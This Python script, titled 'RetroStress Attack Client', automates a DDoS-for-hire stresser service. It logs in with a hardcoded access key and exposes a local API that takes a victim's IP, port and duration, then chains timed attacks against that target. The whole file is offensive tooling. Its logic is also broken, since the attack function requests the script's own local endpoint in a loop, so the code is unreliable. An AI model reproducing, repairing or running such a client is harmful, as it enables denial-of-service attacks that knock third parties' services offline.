import requests
import time
import re
import json
import sys
from urllib.parse import urljoin

class RetroStressClient:
    def __init__(self, base_url="https://retrostress.net"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Sec-Ch-Ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Origin': base_url,
            'Referer': urljoin(base_url, '/auth')
        })
        
    def get_antiforgery_token(self):
        """Extract CSRF/Antiforgery token from cookies"""
        for cookie in self.session.cookies:
            if cookie.name.startswith('.AspNetCore.Antiforgery.'):
                return cookie.value
        return None
    
    def login(self, access_key):
        """Login with access key"""
        print("[*] Attempting to login...")
        
        # First, visit the auth page to get cookies
        auth_page_url = urljoin(self.base_url, '/auth')
        self.session.get(auth_page_url)
        
        # Get antiforgery token
        antiforgery_token = self.get_antiforgery_token()
        if antiforgery_token:
            print(f"[+] Got antiforgery token: {antiforgery_token[:50]}...")
        
        # Login request
        login_url = urljoin(self.base_url, '/Auth/LoginJson')
        login_data = {"accessKey": access_key}
        
        response = self.session.post(
            login_url,
            json=login_data,
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            print("[+] Login successful!")
            
            # Extract auth_token from cookies
            auth_token = None
            for cookie in self.session.cookies:
                if cookie.name == 'auth_token':
                    auth_token = cookie.value
                    print(f"[+] Auth token obtained: {auth_token[:50]}...")
                    break
            
            return True
        else:
            print(f"[-] Login failed with status {response.status_code}")
            print(f"[-] Response: {response.text}")
            return False
    
    def negotiate_blazor(self):
        """Negotiate Blazor/SignalR connection"""
        print("[*] Negotiating Blazor connection...")
        negotiate_url = urljoin(self.base_url, '/_blazor/negotiate?negotiateVersion=1')
        
        self.session.headers.update({
            'X-Requested-With': 'XMLHttpRequest',
            'X-Signalr-User-Agent': 'Microsoft SignalR/10.0 (10.0.7; Unknown OS; Browser; Unknown Runtime Version)'
        })
        
        response = self.session.post(negotiate_url)
        
        if response.status_code == 200:
            print("[+] Blazor negotiation successful!")
            return True
        else:
            print(f"[-] Negotiation failed with status {response.status_code}")
            return False
    
    def send_attack(self, ip, port, duration):
        """Send attack request via API"""
        print(f"[*] Sending attack to {ip}:{port} for {duration} seconds...")
        
        # The API endpoint based on the pattern
        api_url = f"http://127.0.0.1:8080/api?ip={ip}&port={port}&time={duration}"
        
        try:
            # Attempt via session with cookies
            response = self.session.get(api_url, timeout=duration + 5)
            
            if response.status_code == 200:
                print(f"[+] Attack request sent successfully!")
                return True
            else:
                print(f"[-] Attack request failed with status {response.status_code}")
                return False
                
        except requests.exceptions.Timeout:
            print("[+] Attack request sent (timeout expected during attack)")
            return True
        except Exception as e:
            print(f"[-] Error sending attack: {e}")
            return False
    
    def calculate_attacks(self, total_time):
        """Calculate how many attacks and their durations"""
        min_time = 30
        max_time = 60
        
        if total_time <= max_time:
            return [(total_time, 1)]
        
        # For times > 60
        if total_time <= 120:
            # Split into 2 attacks
            attack1 = 60
            attack2 = total_time - 60
            if attack2 < 30:
                attack2 = 30
                attack1 = total_time - 30
            return [(attack1, 1), (attack2, 2)]
        else:
            # For longer durations
            num_attacks = (total_time + 29) // 30  # Ceiling division
            base_time = total_time // num_attacks
            remainder = total_time % num_attacks
            
            attacks = []
            for i in range(num_attacks):
                attack_time = base_time + (1 if i < remainder else 0)
                if attack_time > 60:
                    attack_time = 60
                elif attack_time < 30:
                    attack_time = 30
                attacks.append((attack_time, i + 1))
            
            return attacks
    
    def execute_attacks(self, ip, port, total_time):
        """Execute multiple attacks sequentially"""
        attacks = self.calculate_attacks(total_time)
        
        print(f"\n[+] Total time requested: {total_time} seconds")
        print(f"[+] Splitting into {len(attacks)} attack(s)")
        
        for attack_time, attack_num in attacks:
            print(f"\n[▶] Attack {attack_num}/{len(attacks)} - Duration: {attack_time} seconds")
            
            # Send attack
            start_time = time.time()
            success = self.send_attack(ip, port, attack_time)
            
            if success:
                # Wait for attack to complete
                print(f"[⏳] Attack running for {attack_time} seconds...")
                time.sleep(attack_time)
                elapsed = time.time() - start_time
                print(f"[✓] Attack {attack_num} completed in {elapsed:.1f} seconds")
            else:
                print(f"[✗] Attack {attack_num} failed")
                return False
        
        return True
    
    def process_api_call(self, api_params):
        """Process API call with ip, port, time parameters"""
        # Parse parameters
        ip = api_params.get('ip')
        port = api_params.get('port')
        time_param = api_params.get('time')
        
        if not all([ip, port, time_param]):
            return {"error": "Missing parameters. Need ip, port, and time"}
        
        try:
            total_time = int(time_param)
            
            if total_time < 30:
                return {"error": "Minimum time is 30 seconds"}
            
            # Negotiate Blazor before attack
            self.negotiate_blazor()
            
            # Execute attacks
            success = self.execute_attacks(ip, port, total_time)
            
            if success:
                return {
                    "status": "success",
                    "message": f"Attack(s) completed for {total_time} seconds",
                    "ip": ip,
                    "port": port,
                    "total_time": total_time
                }
            else:
                return {"error": "Attack execution failed"}
                
        except ValueError:
            return {"error": "Invalid time parameter"}


def main():
    # Your auth key embedded here
    ACCESS_KEY = "5a3736056e1d471cb91d92aaaeb867b538392227db7842789080c8a49ae25773"
    
    print("=" * 60)
    print("RetroStress Attack Client")
    print("=" * 60)
    
    # Create client
    client = RetroStressClient()
    
    # Login with embedded key
    if not client.login(ACCESS_KEY):
        print("[-] Login failed. Exiting.")
        sys.exit(1)
    
    # Simulate API server
    print("\n[*] Starting API server on 127.0.0.1:8080")
    print("[*] Waiting for API calls...")
    print("[*] API format: http://127.0.0.1:8080/api?ip=IP&port=PORT&time=TIME")
    print("[*] Time must be minimum 30 seconds, max unlimited (will auto-split)")
    print("[*] Press Ctrl+C to stop\n")
    
    from http.server import HTTPServer, BaseHTTPRequestHandler
    from urllib.parse import urlparse, parse_qs
    
    class APIHandler(BaseHTTPRequestHandler):
        client = client
        
        def do_GET(self):
            if self.path.startswith('/api'):
                # Parse parameters
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                
                # Extract parameters
                ip = params.get('ip', [None])[0]
                port = params.get('port', [None])[0]
                time_param = params.get('time', [None])[0]
                
                print(f"\n[API] Received request: IP={ip}, Port={port}, Time={time_param}")
                
                # Process request
                result = self.client.process_api_call({
                    'ip': ip,
                    'port': port,
                    'time': time_param
                })
                
                # Send response
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(result).encode())
                
                print(f"[API] Response sent: {result.get('status', 'error')}")
                
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'{"error": "Not found"}')
        
        def log_message(self, format, *args):
            # Suppress default logging
            pass
    
    try:
        server = HTTPServer(('127.0.0.1', 8080), APIHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Shutting down API server...")
        server.shutdown()
        print("[*] Server stopped")


if __name__ == "__main__":
    main()
